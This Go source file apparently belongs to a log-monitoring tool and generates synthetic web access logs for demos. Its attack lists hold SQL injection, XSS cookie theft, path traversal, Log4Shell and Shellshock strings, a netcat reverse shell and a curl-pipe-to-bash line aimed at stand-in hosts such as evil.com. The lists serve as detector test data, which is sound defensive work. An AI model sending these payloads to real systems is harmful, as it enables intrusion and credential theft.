package input

import (
	"bytes"
	"context"
	"encoding/json"
	"math/rand"
	"net/netip"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/rs/zerolog/log"

	"github.com/xoelrdgz/logradar/internal/domain"
)

type OutputFormat int

const (
	FormatCLF OutputFormat = iota
	FormatJSON
)

type DemoGenerator struct {
	rate         int
	bufferSize   int
	outputFormat OutputFormat
	mu           sync.Mutex
	running      bool
	stopChan     chan struct{}
	generated    atomic.Uint64

	normalIPs   []netip.Addr
	attackerIPs []netip.Addr
	normalPaths []string
	attackPaths []string
	normalUAs   []string
	attackerUAs []string

	bodyPayloads   []string
	headerPayloads []map[string]string
	cookiePayloads []string
	bufferPool     sync.Pool
}

type DemoConfig struct {
	Rate          int
	BufferSize    int
	AttackPercent int
	Format        OutputFormat
}

func DefaultDemoConfig() DemoConfig {
	return DemoConfig{
		Rate:          1000,
		BufferSize:    50000,
		AttackPercent: 15,
		Format:        FormatCLF,
	}
}

func NewDemoGenerator(config DemoConfig) *DemoGenerator {
	if config.Rate <= 0 {
		config.Rate = 1000
	}
	if config.BufferSize <= 0 {
		config.BufferSize = 10000
	}

	normalIPs := generateIPPool(10000, []string{
		"192.168.", "10.0.", "10.1.", "10.2.", "172.16.", "172.17.",
		"203.0.113.", "198.51.100.", "100.64.", "100.65.",
	})
	attackerIPs := generateIPPool(500, []string{
		"45.33.", "185.220.", "89.234.", "91.121.", "51.15.",
		"104.244.", "198.98.", "209.141.", "23.129.", "171.25.",
	})

	return &DemoGenerator{
		rate:         config.Rate,
		bufferSize:   config.BufferSize,
		outputFormat: config.Format,
		stopChan:     make(chan struct{}),
		normalIPs:    normalIPs,
		attackerIPs:  attackerIPs,
		normalPaths: []string{
			"/", "/index.html", "/about", "/contact", "/products", "/services",
			"/api/users", "/api/products", "/api/orders", "/api/v1/health",
			"/css/main.css", "/js/app.js", "/images/logo.png",
			"/login", "/register", "/dashboard", "/profile", "/settings",
			"/cart", "/checkout", "/search", "/blog",
		},
		attackPaths: []string{
			"/search?q=' OR 1=1--",
			"/products?id=1 UNION SELECT * FROM users--",
			"/api/users?filter=1; DROP TABLE users;--",
			"/login?user=admin'--",
			"/page?id=1 AND SLEEP(5)--",
			"/comment?text=<script>alert('XSS')</script>",
			"/search?q=<img onerror=alert(1) src=x>",
			"/page?x=javascript:alert(document.cookie)",
			"/profile?bio=<svg onload=alert(1)>",
			"/../../../etc/passwd",
			"/..\\..\\..\\windows\\system32\\config\\sam",
			"/files/../../etc/shadow",
			"/.git/config",
			"/.env",
			"/api/ping?host=;cat /etc/passwd",
			"/search?q=|whoami",
			"/cmd?exec=$(/bin/bash -i)",
			"/debug?cmd=`id`",
			"/exec?run=;nc -e /bin/sh attacker.com 4444",
			"/api/v1/run?script=||curl http://evil.com/shell.sh|bash",
			"/download?file=php://filter/convert.base64-encode/resource=/etc/passwd",
			"/include?page=file:///etc/shadow",
			"/preview?doc=phar://uploads/shell.phar",
			"/load?template=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
			"/view?path=expect://whoami",
			"/file?name=../../../etc/passwd%00.png",
			"/wp-admin/", "/wp-login.php",
			"/phpmyadmin/", "/phpMyAdmin/",
			"/admin/", "/administrator/",
			"/.git/HEAD", "/.svn/entries",
		},
		normalUAs: []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X) Safari/17.0",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/121.0",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Mobile Safari",
			"Mozilla/5.0 (Linux; Android 14) Chrome/120.0 Mobile",
		},
		attackerUAs: []string{
			"sqlmap/1.7.11#stable",
			"Nikto/2.1.6",
			"DirBuster-1.0-RC1",
			"WPScan v3.8.25",
			"python-requests/2.31.0",
			"curl/8.4.0",
			"Go-http-client/1.1",
			"masscan/1.3.2",
		},
		bodyPayloads: []string{
			`{"username":"admin","password":"' OR '1'='1"}`,
			`{"query":"SELECT * FROM users WHERE id=1; DROP TABLE users;--"}`,
			`{"search":"1' UNION SELECT username,password FROM users--"}`,
			`{"data":"'; WAITFOR DELAY '0:0:10'--"}`,
			`{"input":"1; EXEC xp_cmdshell('whoami')--"}`,
			`username=admin&password=' OR '1'='1&submit=Login`,
			`search=<script>document.location='http://evil.com/'+document.cookie</script>`,
			`comment=<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">`,
			`data=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
		},
		headerPayloads: []map[string]string{
			{"X-Forwarded-For": "${jndi:ldap://evil.com/exploit}"},
			{"User-Agent": "${jndi:ldap://attacker.com/a}"},
			{"Referer": "${jndi:rmi://evil.com:1099/obj}"},
			{"X-Api-Version": "${jndi:dns://evil.com}"},
			{"User-Agent": "() { :; }; /bin/bash -c 'cat /etc/passwd'"},
			{"Cookie": "() { :;}; echo vulnerable"},
			{"X-Custom-Header": "${env:AWS_SECRET_ACCESS_KEY}"},
			{"Authorization": "Bearer ${jndi:ldap://steal.credentials.com/}"},
			{"X-Forwarded-Host": "evil.com\r\nX-Injected: malicious"},
			{"Host": "localhost\r\nX-Injected-Header: pwned"},
		},
		cookiePayloads: []string{
			"session=admin; admin=true; role=superuser",
			"PHPSESSID='; DROP TABLE sessions;--",
			"auth=<script>document.location='http://evil.com/?c='+document.cookie</script>",
			"token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.",
			"user_id=1 OR 1=1",
			"debug=true; admin=1; bypass_auth=yes",
			"session=${jndi:ldap://evil.com/session}",
		},
		bufferPool: sync.Pool{
			New: func() interface{} {
				return bytes.NewBuffer(make([]byte, 0, 2048))
			},
		},
	}
}

func (g *DemoGenerator) Start(ctx context.Context) (<-chan *domain.LogEntry, <-chan error) {
	entryChan := make(chan *domain.LogEntry, g.bufferSize)
	errChan := make(chan error, 10)

	g.mu.Lock()
	if g.running {
		g.mu.Unlock()
		close(entryChan)
		return entryChan, errChan
	}
	g.running = true
	g.stopChan = make(chan struct{})
	g.mu.Unlock()

	go func() {
		defer close(entryChan)
		defer close(errChan)

		log.Info().Int("rate", g.rate).Msg("Demo generator started (batch mode)")

		batchesPerSecond := 66
		batchSize := g.rate / batchesPerSecond

		if batchSize < 10 {
			batchSize = 10
			batchesPerSecond = g.rate / batchSize
			if batchesPerSecond < 1 {
				batchesPerSecond = 1
				batchSize = g.rate
			}
		}
		if batchSize > 10000 {
			batchSize = 10000
		}

		batchInterval := time.Second / time.Duration(batchesPerSecond)
		if batchInterval < 15*time.Millisecond {
			batchInterval = 15 * time.Millisecond
		}

		ticker := time.NewTicker(batchInterval)
		defer ticker.Stop()

		rng := rand.New(rand.NewSource(time.Now().UnixNano()))

		for {
			select {
			case <-ctx.Done():
				log.Info().Uint64("total_generated", g.generated.Load()).Msg("Demo generator stopped (context cancelled)")
				return
			case <-g.stopChan:
				log.Info().Uint64("total_generated", g.generated.Load()).Msg("Demo generator stopped")
				return
			case <-ticker.C:
				for i := 0; i < batchSize; i++ {
					entry := g.generateEntry(rng)
					select {
					case entryChan <- entry:
						g.generated.Add(1)
					default:
					}
				}
			}
		}
	}()

	return entryChan, errChan
}

func (g *DemoGenerator) generateEntry(rng *rand.Rand) *domain.LogEntry {
	entry := domain.AcquireLogEntry()
	entry.Timestamp = time.Now()
	entry.Protocol = "HTTP/1.1"

	isAttack := rng.Intn(100) < 15

	if isAttack {
		entry.IP = g.attackerIPs[rng.Intn(len(g.attackerIPs))]
		entry.UserAgent = g.attackerUAs[rng.Intn(len(g.attackerUAs))]

		attackType := rng.Intn(4)
		switch attackType {
		case 0:
			entry.Method = "GET"
			entry.Path = g.attackPaths[rng.Intn(len(g.attackPaths))]

		case 1:
			entry.Method = "POST"
			entry.Path = "/api/login"
			entry.Body = []byte(g.bodyPayloads[rng.Intn(len(g.bodyPayloads))])

		case 2:
			entry.Method = "GET"
			entry.Path = g.normalPaths[rng.Intn(len(g.normalPaths))]
			headerPayload := g.headerPayloads[rng.Intn(len(g.headerPayloads))]
			entry.Headers = make(map[string]string)
			for k, v := range headerPayload {
				entry.Headers[k] = v
			}

		case 3:
			entry.Method = "GET"
			entry.Path = "/dashboard"
			entry.SetCookie("session", g.cookiePayloads[rng.Intn(len(g.cookiePayloads))])
		}

		statuses := []int{200, 400, 401, 403, 404, 500}
		entry.StatusCode = statuses[rng.Intn(len(statuses))]
		entry.BytesSent = rng.Intn(500) + 50
	} else {
		entry.IP = g.normalIPs[rng.Intn(len(g.normalIPs))]
		entry.Path = g.normalPaths[rng.Intn(len(g.normalPaths))]
		entry.UserAgent = g.normalUAs[rng.Intn(len(g.normalUAs))]

		methods := []string{"GET", "POST", "PUT", "DELETE"}
		entry.Method = methods[rng.Intn(len(methods))]

		statuses := []int{200, 200, 200, 201, 301, 304}
		entry.StatusCode = statuses[rng.Intn(len(statuses))]
		entry.BytesSent = rng.Intn(10000) + 200
	}

	if g.outputFormat == FormatJSON {
		entry.RawLine = g.generateJSONLine(entry)
	} else {
		entry.RawLine = generateRawLine(entry)
	}

	return entry
}

func generateRawLine(entry *domain.LogEntry) string {
	var b strings.Builder
	b.Grow(200)
	b.WriteString(entry.IP.String())
	b.WriteString(" - - [")
	b.WriteString(entry.Timestamp.Format("02/Jan/2006:15:04:05 -0700"))
	b.WriteString("] \"")
	b.WriteString(entry.Method)
	b.WriteByte(' ')
	b.WriteString(entry.Path)
	b.WriteString(" HTTP/1.1\" ")
	b.WriteString(intToStr(entry.StatusCode))
	b.WriteByte(' ')
	b.WriteString(intToStr(entry.BytesSent))
	b.WriteString(" \"-\" \"")
	b.WriteString(entry.UserAgent)
	b.WriteByte('"')
	return b.String()
}

type DemoJSONLogEntry struct {
	Timestamp   string            `json:"timestamp"`
	RemoteAddr  string            `json:"remote_addr"`
	Method      string            `json:"request_method"`
	Path        string            `json:"request_uri"`
	Protocol    string            `json:"server_protocol"`
	Status      int               `json:"status"`
	BodyBytes   int               `json:"body_bytes_sent"`
	UserAgent   string            `json:"http_user_agent"`
	Referer     string            `json:"http_referer,omitempty"`
	RequestBody string            `json:"request_body,omitempty"`
	Headers     map[string]string `json:"http_headers,omitempty"`
	Cookies     map[string]string `json:"http_cookies,omitempty"`
}

func (g *DemoGenerator) generateJSONLine(entry *domain.LogEntry) string {
	buf := g.bufferPool.Get().(*bytes.Buffer)
	buf.Reset()
	defer g.bufferPool.Put(buf)
	jsonEntry := DemoJSONLogEntry{
		Timestamp:  entry.Timestamp.Format(time.RFC3339),
		RemoteAddr: entry.IP.String(),
		Method:     entry.Method,
		Path:       entry.Path,
		Protocol:   entry.Protocol,
		Status:     entry.StatusCode,
		BodyBytes:  entry.BytesSent,
		UserAgent:  entry.UserAgent,
	}

	if len(entry.Body) > 0 {
		jsonEntry.RequestBody = string(entry.Body)
	}
	if len(entry.Headers) > 0 {
		jsonEntry.Headers = entry.Headers
	}
	if len(entry.Cookies) > 0 {
		jsonEntry.Cookies = entry.Cookies
	}

	enc := json.NewEncoder(buf)
	enc.SetEscapeHTML(false)
	if err := enc.Encode(jsonEntry); err != nil {
		return "{\"error\":\"encoding failed\"}"
	}

	result := buf.String()
	if len(result) > 0 && result[len(result)-1] == '\n' {
		result = result[:len(result)-1]
	}

	return result
}

func intToStr(n int) string {
	if n == 0 {
		return "0"
	}
	var buf [20]byte
	i := len(buf)
	for n > 0 {
		i--
		buf[i] = byte('0' + n%10)
		n /= 10
	}
	return string(buf[i:])
}

func (g *DemoGenerator) Stop() error {
	g.mu.Lock()
	defer g.mu.Unlock()

	if !g.running {
		return nil
	}

	close(g.stopChan)
	g.running = false

	return nil
}

func (g *DemoGenerator) IsRunning() bool {
	g.mu.Lock()
	defer g.mu.Unlock()
	return g.running
}

func (g *DemoGenerator) Generated() uint64 {
	return g.generated.Load()
}

func generateIPPool(count int, prefixes []string) []netip.Addr {
	ips := make([]netip.Addr, 0, count)
	perPrefix := count / len(prefixes)
	remainder := count % len(prefixes)

	for i, prefix := range prefixes {
		n := perPrefix
		if i < remainder {
			n++
		}
		for j := 0; j < n; j++ {
			third := (j / 256) % 256
			fourth := j % 256
			if fourth == 0 {
				fourth = 1
			}

			ipStr := prefix + intToStr(third) + "." + intToStr(fourth)
			if addr, err := netip.ParseAddr(ipStr); err == nil {
				ips = append(ips, addr)
			}
		}
	}

	return ips
}
